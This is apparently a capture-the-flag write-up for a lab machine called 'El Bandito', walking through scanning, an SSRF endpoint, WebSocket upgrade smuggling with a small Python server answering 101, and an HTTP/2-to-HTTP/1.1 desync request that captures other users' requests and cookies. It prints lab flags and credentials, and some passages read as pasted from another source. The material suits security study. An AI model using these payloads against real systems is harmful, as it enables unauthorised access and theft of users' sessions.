# El Bandito
This exercise demonstrates not only proficiency with industry-standard tools such as Burp Suite, Nmap, and Python, but also a deep understanding of network protocols ``(HTTP/1.1 and WebSockets)``. The ability to identify a desynchronization between a proxy and a backend is a critical skill in AppSec and penetration testing roles, as it allows for the prevention of attacks that often go unnoticed by automated vulnerability scanners.

- Below is a step-by-step technical breakdown, from the first packet sent to the capture of the flag and the admin credentials.


### " A quick overview for those just getting started"
- From Silent Scanning to Protocol Desynchronization
In the modern cybersecurity ecosystem, vulnerabilities rarely occur in isolation. The true art of ethical hacking lies in vulnerability chaining: the ability to chain together minor flaws to compromise a robust system. This technical report documents the intrusion into the “El Bandito” machine, an environment notable for its use of advanced evasion and traffic manipulation techniques.

	 -The Scenario: Beyond the Obvious
What began as a standard enumeration revealed a deceptive attack surface. While traditional ports such as 22 (SSH) and 80 (HTTP) had hardened configurations, in-depth analysis detected a microservices architecture protected by a reverse proxy (Nginx) and a Spring Boot-based backend.

	- The Pillars of the Attack:
Evasive Reconnaissance: Implementation of fragmented scans to evade intrusion detection systems (IDS).

	 - SSRF (Server-Side Request Forgery): Exploitation of a vulnerable endpoint that allowed the attacker to make internal requests “on behalf” of the server.

	- WebSocket Request Smuggling: The key component. A sophisticated technique that exploits the way proxies handle the WebSocket “handshake” to create an out-of-sync communication tunnel, allowing access controls to be bypassed and critical data to be extracted.




```bash
nmap -sS -T3 -Pn -f --data-length 50 192.168.1.100
```


- This command combines a slow SYN scan—without pinging—with fragmentation and data padding to make it less detectable.
    - T3: velocidad aceptable, discreción moderada.

- We start with a Nmap scan, and discover four open ports: 22, 22, 80, 631, and 8080.
![alt text](<Captura de pantalla 2026-03-25 215053.png>)

```Bash
nmap -sC -sV -p 22,80,631,8080 10.66.169.155
Starting Nmap 7.80 ( https://nmap.org ) at 2026-03-26 00:43 GMT
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Stats: 0:00:47 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 75.00% done; ETC: 00:44 (0:00:15 remaining)
Stats: 0:01:47 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 75.00% done; ETC: 00:45 (0:00:35 remaining)
Nmap scan report for elbndito.thm (10.66.169.155)
Host is up (0.00040s latency).

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp   open  ssl/http El Bandito Server
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 NOT FOUND
|     Date: Thu, 26 Mar 2026 00:44:20 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 207
|     Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: SAMEORIGIN
|     X-XSS-Protection: 1; mode=block
|     Feature-Policy: microphone 'none'; geolocation 'none';
|     Age: 0
|     Server: El Bandito Server
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Thu, 26 Mar 2026 00:43:30 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 58
|     Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: SAMEORIGIN
|     X-XSS-Protection: 1; mode=block
|     Feature-Policy: microphone 'none'; geolocation 'none';
|     Age: 0
|     Server: El Bandito Server
|     Accept-Ranges: bytes
|     Connection: close
|     nothing to see <script src='/static/messages.js'></script>
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Thu, 26 Mar 2026 00:43:30 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 0
|     Allow: GET, OPTIONS, POST, HEAD
|     Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: SAMEORIGIN
|     X-XSS-Protection: 1; mode=block
|     Feature-Policy: microphone 'none'; geolocation 'none';
|     Age: 0
|     Server: El Bandito Server
|     Accept-Ranges: bytes
|     Connection: close
|   RTSPRequest: 
|_    HTTP/1.1 400 Bad Request
|_http-server-header: El Bandito Server
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
| ssl-cert: Subject: commonName=localhost
| Subject Alternative Name: DNS:localhost
| Not valid before: 2021-04-10T06:51:56
|_Not valid after:  2031-04-08T06:51:56
631/tcp  open  ipp      CUPS 2.4
|_http-server-header: CUPS/2.4 IPP/2.1
|_http-title: Bad Request - CUPS v2.4.12
8080/tcp open  http     nginx
|_http-title: Site doesn't have a title (application/json;charset=UTF-8).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.80%T=SSL%I=7%D=3/26%Time=69C48133%P=x86_64-pc-linux-gnu%
SF:r(GetRequest,1E5,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Thu,\x2026\x20Mar\
SF:x202026\x2000:43:30\x20GMT\r\nContent-Type:\x20text/html;\x20charset=ut
SF:f-8\r\nContent-Length:\x2058\r\nContent-Security-Policy:\x20default-src
SF:\x20'self';\x20script-src\x20'self';\x20object-src\x20'none';\r\nX-Cont
SF:ent-Type-Options:\x20nosniff\r\nX-Frame-Options:\x20SAMEORIGIN\r\nX-XSS
SF:-Protection:\x201;\x20mode=block\r\nFeature-Policy:\x20microphone\x20'n
SF:one';\x20geolocation\x20'none';\r\nAge:\x200\r\nServer:\x20El\x20Bandit
SF:o\x20Server\r\nAccept-Ranges:\x20bytes\r\nConnection:\x20close\r\n\r\nn
SF:othing\x20to\x20see\x20<script\x20src='/static/messages\.js'></script>"
SF:)%r(HTTPOptions,1CB,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Thu,\x2026\x20M
SF:ar\x202026\x2000:43:30\x20GMT\r\nContent-Type:\x20text/html;\x20charset
SF:=utf-8\r\nContent-Length:\x200\r\nAllow:\x20GET,\x20OPTIONS,\x20POST,\x
SF:20HEAD\r\nContent-Security-Policy:\x20default-src\x20'self';\x20script-
SF:src\x20'self';\x20object-src\x20'none';\r\nX-Content-Type-Options:\x20n
SF:osniff\r\nX-Frame-Options:\x20SAMEORIGIN\r\nX-XSS-Protection:\x201;\x20
SF:mode=block\r\nFeature-Policy:\x20microphone\x20'none';\x20geolocation\x
SF:20'none';\r\nAge:\x200\r\nServer:\x20El\x20Bandito\x20Server\r\nAccept-
SF:Ranges:\x20bytes\r\nConnection:\x20close\r\n\r\n")%r(RTSPRequest,1C,"HT
SF:TP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(FourOhFourRequest,26C,"HTT
SF:P/1\.1\x20404\x20NOT\x20FOUND\r\nDate:\x20Thu,\x2026\x20Mar\x202026\x20
SF:00:44:20\x20GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nCont
SF:ent-Length:\x20207\r\nContent-Security-Policy:\x20default-src\x20'self'
SF:;\x20script-src\x20'self';\x20object-src\x20'none';\r\nX-Content-Type-O
SF:ptions:\x20nosniff\r\nX-Frame-Options:\x20SAMEORIGIN\r\nX-XSS-Protectio
SF:n:\x201;\x20mode=block\r\nFeature-Policy:\x20microphone\x20'none';\x20g
SF:eolocation\x20'none';\r\nAge:\x200\r\nServer:\x20El\x20Bandito\x20Serve
SF:r\r\nConnection:\x20close\r\n\r\n<!doctype\x20html>\n<html\x20lang=en>\
SF:n<title>404\x20Not\x20Found</title>\n<h1>Not\x20Found</h1>\n<p>The\x20r
SF:equested\x20URL\x20was\x20not\x20found\x20on\x20the\x20server\.\x20If\x
SF:20you\x20entered\x20the\x20URL\x20manually\x20please\x20check\x20your\x
SF:20spelling\x20and\x20try\x20again\.</p>\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 138.77 seconds
```

What we found with that scan is basically a map of active services on the target machine. Here’s a summary of the most important points:

- 22/tcp → SSH (OpenSSH 8.2p1 on Ubuntu Linux)  
This indicates that the server allows secure remote connections via SSH. It’s a common entry point in penetration testing challenges.

- 80/tcp → HTTP with SSL (El Bandito Server)  
A custom web server (“El Bandito Server”) is running here. Nmap detected responses to GET and OPTIONS requests, with security headers configured (CSP, X-Frame-Options, etc.). You also saw a self-signed SSL certificate with CN=localhost, valid from 2021 to 2031.

- 631/tcp → IPP (CUPS 2.4)  
This port corresponds to the CUPS printing system. It is common in Linux environments and can be an attack vector if misconfigured.

- 8080/tcp → HTTP (nginx)  
Another web server, this time running nginx, which returns JSON-type content. Port 8080 is often used for secondary web applications or administration panels.

## We use Gobuster to determine the directories of the web applications.

- endpoint: 22 does not detect directories
- endpoint: 80 does not detect directories


The header that Nmap detects on port 8080 is:
```Bash
 (application/json;charset=UTF-8)
```
This means that the HTTP response has a Content-Type header set to application/json.

The server identified is nginx, which acts as a proxy or web server.

There is no direct reference to Spring Boot or the Spring Framework.
 The only thing that's certain is that port 8080 is serving an API or endpoint that returns JSON.

 - Continuing with our directory search 
 
 ```Bash
  gobuster dir -u http://10.66.169.155:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.66.169.155:8080
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/info                 (Status: 200) [Size: 2]
/admin                (Status: 403) [Size: 146]
/health               (Status: 200) [Size: 150]
/assets               (Status: 200) [Size: 0]
/traceroute           (Status: 403) [Size: 146]
/trace                (Status: 403) [Size: 146]
/environment          (Status: 403) [Size: 146]
/administration       (Status: 403) [Size: 146]
/envelope_small       (Status: 403) [Size: 146]
/error                (Status: 500) [Size: 88]
/envelope             (Status: 403) [Size: 146]
/administrator        (Status: 403) [Size: 146]
/metrics              (Status: 403) [Size: 146]
/envolution           (Status: 403) [Size: 146]
/env                  (Status: 403) [Size: 146]
/dump                 (Status: 403) [Size: 146]
/tracert              (Status: 403) [Size: 146]
/administr8           (Status: 403) [Size: 146]
/environmental        (Status: 403) [Size: 146]
/administrative       (Status: 403) [Size: 146]
/tracer               (Status: 403) [Size: 146]
/administratie        (Status: 403) [Size: 146]
/token                (Status: 200) [Size: 8]
/admins               (Status: 403) [Size: 146]
/admin_images         (Status: 403) [Size: 146]
/envelopes            (Status: 403) [Size: 146]
/administrivia        (Status: 403) [Size: 146]
/beans                (Status: 403) [Size: 146]
/env40x40             (Status: 403) [Size: 146]
/traces               (Status: 403) [Size: 146]
/enviro               (Status: 403) [Size: 146]
/environnement        (Status: 403) [Size: 146]
/enve                 (Status: 403) [Size: 146]
/administrative-law   (Status: 403) [Size: 146]
/traceback            (Status: 403) [Size: 146]
/administrators       (Status: 403) [Size: 146]
/tracemap_small       (Status: 403) [Size: 146]
/tracemap_large       (Status: 403) [Size: 146]
/admin1               (Status: 403) [Size: 146]
/trace1               (Status: 403) [Size: 146]
/environ              (Status: 403) [Size: 146]
/administer           (Status: 403) [Size: 146]
/admin3_gtpointup     (Status: 403) [Size: 146]
/beanshell            (Status: 403) [Size: 146]
/dumpster-diving      (Status: 403) [Size: 146]
/envhoax              (Status: 403) [Size: 146]
/envs                 (Status: 403) [Size: 146]
/admin_hp             (Status: 403) [Size: 146]
/traceability         (Status: 403) [Size: 146]
/admin25              (Status: 403) [Size: 146]
/envivio-color        (Status: 403) [Size: 146]
/envir                (Status: 403) [Size: 146]
/tracesanction        (Status: 403) [Size: 146]
/envelope_icon        (Status: 403) [Size: 146]
/envirohealth         (Status: 403) [Size: 146]
/envelope2            (Status: 403) [Size: 146]
/envy                 (Status: 403) [Size: 146]
/admin02              (Status: 403) [Size: 146]
/environments         (Status: 403) [Size: 146]
/administrationinfo   (Status: 403) [Size: 146]
/admin_thumb          (Status: 403) [Size: 146]
/admin_full           (Status: 403) [Size: 146]
/admin_functions      (Status: 403) [Size: 146]
/traceabilitybcp_v1   (Status: 403) [Size: 146]
/traceroute_art       (Status: 403) [Size: 146]
/External%5CX-News    (Status: 400) [Size: 0]
/tracert_broken       (Status: 403) [Size: 146]
/trace-ping           (Status: 403) [Size: 146]
/traceroute-          (Status: 403) [Size: 146]
/traceroute-eng       (Status: 403) [Size: 146]
/trace-them           (Status: 403) [Size: 146]
/traceroute-tables    (Status: 403) [Size: 146]
/trace4               (Status: 403) [Size: 146]
/admin2               (Status: 403) [Size: 146]
/traceremover         (Status: 403) [Size: 146]
/traceless            (Status: 403) [Size: 146]
/adminhelp            (Status: 403) [Size: 146]
/tracemap             (Status: 403) [Size: 146]
/envision             (Status: 403) [Size: 146]
/administratoraccounts (Status: 403) [Size: 146]
/traceme              (Status: 403) [Size: 146]
/tracerx              (Status: 403) [Size: 146]
/dumpdates            (Status: 403) [Size: 146]
/dumps                (Status: 403) [Size: 146]
/environmental_issues (Status: 403) [Size: 146]
/adminoffice          (Status: 403) [Size: 146]
/envelope_21x16       (Status: 403) [Size: 146]
/envelopes_110x19     (Status: 403) [Size: 146]
/administracja        (Status: 403) [Size: 146]
/environmental-law    (Status: 403) [Size: 146]
/trace3d_2            (Status: 403) [Size: 146]
/trace3d_1            (Status: 403) [Size: 146]
Progress: 218275 / 218276 (100.00%)
===============================================================
Finished
===============================================================
```
![alt text](<Captura de pantalla 2026-03-25 225218.png>)


- The Burn Token page has a form that offers interaction.
![alt text](<Captura de pantalla 2026-03-25 225332.png>)


## “Burn Token” Form:

- It submits data (address, amount), but there appears to be no validation or sanitization on the client side.

- If the server does not validate the data properly, there could be a risk of injection (e.g., SQLi, reflected XSS if the input is passed through).

- Use of WebSocket (ws:// or wss://):

- The client opens a WebSocket channel to /ws.

- It sends JSON messages with the “burn” action.

- If the server does not validate these messages, there could be issues such as command injection, business logic manipulation, or even DoS.

- Additionally, WebSockets may be susceptible to Cross-Site WebSocket Hijacking (CSWSH) if there is no authentication or origin verification.

![alt text](<Captura de pantalla 2026-03-25 230336.png>)

- The browser attempts to load app.js and jquery-1.10.2.min.js from the server on port 8080, but those paths do not exist or return a 404 Not Found error.

- The attempt to open a WebSocket to ws://10.66.169.155:8080/ws fails with a “Connection Refused” error, which means the server does not have that endpoint active or it is blocked.

- Messages such as “This service is not working on purpose ;” confirm that the WebSocket is intentionally closed.

## “Attempt to Intercept Traffic via WebSocket”  
When intercepting the requests generated by burn.html in Burp Suite, we observed an ```httpHTTP/1.1``` WebSocket handshake. This suggests that the vulnerability may not lie in traditional HTTP routes, but rather in the WebSocket channel; therefore, the analysis will focus on manipulating and desynchronizing that communication flow.

![alt text](<Captura de pantalla 2026-03-25 234951.png>) ![alt text](<Captura de pantalla 2026-03-25 230850.png>) ![alt text](<Captura de pantalla 2026-03-25 230336-1.png>)


## Spring Actuators

```http
Key Points:
-  Spring Boot Actuators register endpoints such as /health, /trace, /beans, /env, etc. In versions 1 to 1.4, these endpoints are accessible without authentication. From version 1.5 onwards, only /health and /info are non-sensitive by default, but developers often disable this security.

- Certain Actuator endpoints can expose sensitive data or allow harmful actions:
/dump, /trace, /logfile, /shutdown, /mappings, /env, /actuator/env, /restart, and /heapdump.
In Spring Boot 1.x, actuators are registered under the root URL, while in 2.x, they are under the /actuator/ base path.
```

Common examples:

/actuator/health → application status.

/actuator/env → environment variables.

/actuator/metrics → internal metrics.



![alt text](<Captura de pantalla 2026-03-26 004254.png>)

- We describe how request smuggling can be enabled by exploiting the WebSocket Upgrade. The idea is to create a malformed request that tricks the proxy into believing a WebSocket connection has been established, while the backend continues to expect normal HTTP traffic.

A conceptual example would be sending a handshake with an incorrect version number, such as `Sec-WebSocket-Version: 777`.

     -The proxy interprets this as a valid WebSocket and opens a direct tunnel between the client and the server.

     -The backend, however, does not recognize that version and continues to expect HTTP requests.

    - This desynchronization opens the door for additional requests to “sneak” into the tunnel, which constitutes the smuggling.

- Objective of the Attack
The purpose of this technique is to bypass proxy restrictions and access resources that would normally be blocked. For example, administrative endpoints such as those in Spring Actuator (/actuator/env, /actuator/metrics, etc.), which can expose sensitive information.

- Result in this case
In the scenario you describe, although an attempt was made to apply this technique (using an incorrect version and manipulating the handshake), it did not work. The proxy and the backend did not become desynchronized, so access to the restricted resources was not achieved.

1. We intercept the request
In Burp Suite, we see that the application makes a call to an endpoint such as:
```http
/isOnline?url=http://attacker-server/
```

This is already a sign of an SSRF vulnerability, because the server is taking a URL parameter and using it to make an internal request.

2. Server controlled by the attacker
If the attacker controls the server that the URL parameter points to, they can decide which responses to send.
In this educational example, the server would respond with a 101 Switching Protocols status code, which is used to establish a WebSocket.

3. Proxy ↔ Backend Desynchronization
The proxy interprets the 101 response as if a valid WebSocket Upgrade had been performed.

The backend, however, continues to expect normal HTTP traffic.

This difference in interpretation is known as Request Smuggling: the proxy opens a tunnel that isn’t actually validated.

4. The attacker’s objective
The purpose of this technique is to bypass restrictions.

The proxy believes that a WebSocket connection has been established and allows traffic to pass through without inspection.

The attacker exploits this tunnel to send additional HTTP requests to restricted internal resources (for example, `/actuator/env` in a Spring Boot application).

5. Result in your case
In the scenario you describe, although this technique was attempted, it did not work: the proxy and the backend did not become desynchronized as expected, so access to the restricted resources was not achieved.

- Teaching conclusion:  
This example demonstrates how a vulnerable parameter (url) can be exploited for SSRF, and how returning a 101 status code attempts to force the proxy to open a WebSocket tunnel. The potential risk is that this tunnel could enable request smuggling and access to internal resources. Although it was unsuccessful here, it serves as a good illustration of how SSRF and WebSocket Upgrade are combined in a security lab.

    - Now that we have the clue, we can use a Python server from previous labs and try again

```python
Insert in tthe GET:
/isOnline?url=http://attacker-server/

	import sys
	from http.server import HTTPServer, BaseHTTPRequestHandler
	
	if len(sys.argv)-1 != 1:
	    print("""
	Usage: {} 
	    """.format(sys.argv[0]))
	    sys.exit()
	
	class Redirect(BaseHTTPRequestHandler):
	   def do_GET(self):
	       self.protocol_version = "HTTP/1.1"
	       self.send_response(101)
	       self.end_headers()
	
	HTTPServer(("", int(sys.argv[1])), Redirect).serve_forever()
```

```python
python server.py 5555
```

# Request

![alt text](<Captura de pantalla 2026-03-26 025410.png>) 


![alt text](<Captura de pantalla 2026-03-26 025312.png>)



# The  Flag

1. 
```HTTP
HTTP/1.1 101 
Server: nginx
Date: Thu, 26 Mar 2026 06:34:05 GMT
Connection: upgrade
X-Application-Context: application:8081

HTTP/1.1 200 
X-Application-Context: application:8081
Content-Type: text/plain
Content-Length: 43
Date: Thu, 26 Mar 2026 06:34:05 GMT

THM{:::MY_DECLINATION:+62°_14\'_31.4'':::}
```

![alt text](<Captura de pantalla 2026-03-26 033709.png>)


2. 
```HTTP
HTTP/1.1 101 
Server: nginx
Date: Thu, 26 Mar 2026 06:37:48 GMT
Connection: upgrade
X-Application-Context: application:8081

HTTP/1.1 200 
X-Application-Context: application:8081
Content-Type: text/plain
Content-Length: 55
Date: Thu, 26 Mar 2026 06:37:48 GMT

username:hAckLIEN password:YouCanCatchUsInYourDreams404

```
![alt text](<Captura de pantalla 2026-03-26 033953.png>)

## Analysis
- SSRF: The initial exploit vector was an SSRF, because the server accepted a URL parameter and used it to make an internal request to your server.

- WebSocket Request Smuggling: Success came from combining that SSRF with a malformed WebSocket Upgrade. The proxy opened a channel that wasn’t properly validated, and sensitive information leaked through it.

- HTTP Smuggling and Browser Desync: These were considered as hypotheses, but they weren’t the ones that worked in this case.

## Conclusion
The exploitation that was successful was WebSocket Request Smuggling supported by SSRF.

The SSRF allowed the request to be redirected to your controlled server.

The malformed WebSocket Upgrade caused the proxy ↔ backend desynchronization.

That combination was what exposed the credentials and the flag.

In terms of cybersecurity, this finding is a clear example of how an endpoint vulnerable to SSRF can serve as a gateway to exploit more advanced techniques such as WebSocket Request Smuggling, gaining access to sensitive information that would otherwise be protected.


# The Second Flag


We perform port scanning:
```Bash
root@ip-10-66-126-11:~#  curl -ksi  https://elbandito.thm:80
HTTP/2 200 
date: Fri, 27 Mar 2026 00:41:10 GMT
content-type: text/html; charset=utf-8
content-length: 58
content-security-policy: default-src 'self'; script-src 'self'; object-src 'none';
x-content-type-options: nosniff
x-frame-options: SAMEORIGIN
x-xss-protection: 1; mode=block
feature-policy: microphone 'none'; geolocation 'none';
age: 0
server: El Bandito Server
accept-ranges: bytes

```
![alt text](<Captura de pantalla 2026-03-26 214907.png>)


```http
view-source:https://elbandito.thm:80/messages
```
![alt text](<Captura de pantalla 2026-03-26 222908.png>)

```http
view-source:https://elbandito.thm:80/static/messages.js
```
```javascript
document.addEventListener("DOMContentLoaded", function () {
	const discussions = document.querySelectorAll(".discussion");
	const messagesChat = document.querySelector(".messages-chat");
	const headerName = document.querySelector(".header-chat .name");
	const writeMessageInput = document.querySelector(".write-message");
	let userMessages = {
		JACK: [],
		OLIVER: [],
	};

	// Function to fetch messages from the server
	function fetchMessages() {
		fetch("/getMessages")
			.then((response) => {
				if (!response.ok) {
					throw new Error("Failed to fetch messages");
				}
				return response.json();
			})
			.then((messages) => {
				userMessages = messages;
				userMessages.JACK === undefined
					? (userMessages = { OLIVER: messages.OLIVER, JACK: [] })
					: userMessages.OLIVER === undefined &&
					  (userMessages = { JACK: messages.JACK, OLIVER: [] });

				displayMessages("JACK");
			})
			.catch((error) => console.error("Error fetching messages:", error));
	}

	// Function to display messages for the selected user
	function displayMessages(userName) {
		headerName.innerText = userName;
		messagesChat.innerHTML = "";
		userMessages[userName].forEach(function (messageData) {
			appendMessage(messageData);
		});
	}

	// Function to append a message to the chat area
	function appendMessage(messageData) {
		const newMessage = document.createElement("div");
		console.log({ messageData });
		newMessage.classList.add("message", "text-only");
		newMessage.innerHTML = `
           ${messageData.sender !== "Bot" ? '<div class="response">' : ""}
        <div class="text">${messageData}</div>
    ${messageData.sender !== "Bot" ? "</div>" : ""}
        `;
		messagesChat.appendChild(newMessage);
	}

	// Function to send a message to the server
	function sendMessage() {
		const messageText = writeMessageInput.value.trim();
		if (messageText !== "") {
			const activeUser = headerName.innerText;
			const urlParams = new URLSearchParams(window.location.search);
			const isBot =
				urlParams.has("msg") && urlParams.get("msg") === messageText;

			const messageData = {
				message: messageText,
				sender: isBot ? "Bot" : activeUser, // Set the sender as "Bot"
			};
			userMessages[activeUser].push(messageData);
			appendMessage(messageText);
			writeMessageInput.value = "";
			scrollToBottom();
			console.log({ activeUser });
			fetch("/send_message", {
				method: "POST",
				headers: {
					"Content-Type": "application/x-www-form-urlencoded",
				},
				body: "data="+messageText
			})
				.then((response) => {
					if (!response.ok) {
						throw new Error("Network response was not ok");
					}
					console.log("Message sent successfully");
				})
				.catch((error) => {
					console.error("Error sending message:", error);
					// Handle error (e.g., display error message to the user)
				});
		}
	}

	// Event listeners
	discussions.forEach(function (discussion) {
		discussion.addEventListener("click", function () {
			const userName = this.dataset.name;
			console.log({ userName });
			displayMessages(userName.toUpperCase());
		});
	});

	const sendButton = document.querySelector(".send");
	sendButton.addEventListener("click", sendMessage);
	writeMessageInput.addEventListener("keydown", function (event) {
		if (event.key === "Enter") {
			event.preventDefault();
			sendMessage();
		}
	});

	// Initial actions
	fetchMessages();
});

// Function to scroll to the bottom of the messages chat
function scrollToBottom() {
	const messagesChat = document.getElementById("messages-chat");
	messagesChat.scrollTop = messagesChat.scrollHeight;
}
```

- Vulnerabilidades identificadas
Cross-Site Scripting (XSS)

El uso de innerHTML para insertar directamente messageData en el DOM sin sanitización:

```js
newMessage.innerHTML = `
   <div class="text">${messageData}</div>
`;
```
Si un atacante controla el contenido de messageData, puede inyectar HTML o JavaScript malicioso.

- SSRF (Server-Side Request Forgery) / Manipulación de parámetros

El código utiliza parámetros de la URL (msg) para modificar la lógica de quién es el remitente:

```js
const urlParams = new URLSearchParams(window.location.search);
const isBot = urlParams.has("msg") && urlParams.get("msg") === messageText;
```
Si el backend usa estos valores para construir peticiones, podría abrir la puerta a SSRF o manipulación de lógica.

- HTTP Desync / Smuggling

El endpoint /send_message recibe datos sin validación estricta:

```js
fetch("/send_message", {
  method: "POST",
  headers: { "Content-Type": "application/x-www-form-urlencoded" },
  body: "data="+messageText
})
```
En un entorno con frontend HTTP/2 y backend HTTP/1.1, este endpoint es susceptible a HTTP desync smuggling (H2→H1), porque el proxy y el backend pueden interpretar de forma distinta la longitud del cuerpo (Content-Length), permitiendo inyectar peticiones adicionales.


### Information Disclosure / Endpoints sensibles

Ya vimos que /getMessages y ``/send_message`` pueden devolver datos sin autenticación fuerte.

Esto encaja con lo que encontraste en ``/trace``, ``/admin-creds`` y ``/admin-flag``: endpoints expuestos que revelan información sensible.

- ### Attack Vector:  
The endpoint /send_message was chosen for testing.

	- A crafted request was sent with Content-Length: 0.

	- The frontend (HTTP/2) interpreted the request as empty.

	- The backend (HTTP/1.1) treated the same request as two separate ones.

	- This discrepancy allowed the attacker to smuggle a new request into the backend’s queue.

Validation:  
To confirm the exploit worked, the smuggled request was directed to /ping. The successful execution demonstrated that the desync attack was viable.
![alt text](<Captura de pantalla 2026-03-27 024006.png>)

- Technique Used:  
A crafted header Foo: x was inserted into the second request.

- Mechanism:  
When the smuggled request was queued, the victim’s legitimate request was appended to the crafted header.

Example: Foo: xGET / HTTP/1.1

This manipulation caused the backend to interpret the path as /ping.

- Outcome:  
By sending the crafted request twice, the backend responded to the smuggled /ping request instead of the intended /send_message.

- Confirmation:  
This behavior validated that the application was vulnerable to HTTP desync smuggling (H2 → H1), since the frontend and backend parsed the request differently, allowing injection of hidden requests.

![alt text](<Captura de pantalla 2026-03-27 024156.png>)

The payload I used was as follows:

```http
POST /save HTTP/2
Host: 10.10.142.148:80
Cookie: session=eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.aMMhBg.rfP3Iv0V-dhtpPm5ZQzReow5IcE
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Content-Length: 0

POST /send_message HTTP/1.1
Host: 10.10.142.148:80
Cookie: session=eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.aMMhBg.rfP3Iv0V-dhtpPm5ZQzReow5IcE
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 900

data=
```
- Initial Setup:  
The attacker targeted the /save endpoint, which accepted the POST method. This endpoint had previously not yielded results.

- Smuggling Technique:  
Within the POST request to /save, a smuggled request was embedded targeting /send_message.

The attacker’s cookies were used to authenticate the smuggled request.

The payload was crafted to capture approximately 900 characters of data.

- Mechanism of Exploit:  
When a legitimate user made a request (e.g., accessing /), that request was queued behind the attacker’s smuggled request.

The entire content of the user’s request (method, headers, body) was absorbed into the attacker’s request.

This data was injected into the data= parameter of the smuggled /send_message request.

- Outcome:  
The attacker successfully exfiltrated the content of another user’s request by leveraging the desynchronization between frontend and backend parsing.

This confirmed that HTTP desync smuggling could be used to hijack and capture user traffic.

![alt text](<Captura de pantalla 2026-03-27 031802.png>)


### -  Summary of the Exploitation via /send_message
Setup:  
The attacker analyzed captured traffic and confirmed interception of a user attempting to log in at /login. This yielded the victim’s cookies, which served as the second flag.

- Observation:  
The application allowed storing and retrieving text data through messages. This feature could be abused to capture other users’ requests.

- Attack Vector:

A deliberately incomplete request was sent to /send_message.

The request used an excessively long Content-Length header.

The attacker’s own cookie was included, since authorization was required to send messages.

- Mechanism:

Because of the desynchronization between frontend and backend, subsequent legitimate user requests were appended to the attacker’s incomplete request.

These requests were then interpreted as the data= parameter of the attacker’s /send_message request.

As a result, the victim’s request content was stored as a message.

- Outcome:  
Shortly after sending the crafted request, the attacker retrieved messages and observed that another user’s request had been appended to their payload. This confirmed successful interception and storage of victim traffic.
![alt text](<Captura de pantalla 2026-03-27 032009.png>)

